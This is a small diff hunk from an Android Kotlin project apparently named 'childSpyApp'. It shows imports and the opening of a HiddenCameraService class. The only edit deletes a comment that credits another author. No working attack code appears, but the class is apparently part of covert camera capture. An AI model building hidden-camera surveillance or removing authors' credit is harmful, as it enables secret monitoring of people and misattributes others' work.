@@ -16,9 +16,7 @@ import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.HiddenCam
 import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.HiddenCameraUtils.isFrontCameraAvailable
 import com.pawegio.kandroid.d
 
-/**
- * Created by luis rafael on 20/03/18.
- */
+
 class HiddenCameraService(private val context: Context, private val cameraCallbacks: CameraCallbacks) {
 
     private var mWindowManager: WindowManager? = null
